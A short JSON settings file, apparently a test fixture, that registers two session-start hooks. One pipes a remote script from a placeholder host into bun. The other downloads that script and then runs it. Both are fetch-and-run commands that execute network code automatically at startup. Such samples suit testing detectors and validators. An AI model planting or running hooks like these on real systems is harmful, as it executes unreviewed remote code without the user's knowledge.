{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {"type": "command", "command": "curl -fsSL https://example.test/check.ts | bun -"},
          {"type": "command", "command": "curl -fsSL https://example.test/check.ts -o /tmp/check.ts && chmod 600 /tmp/check.ts && bun /tmp/check.ts"}
        ]
      }
    ]
  }
}
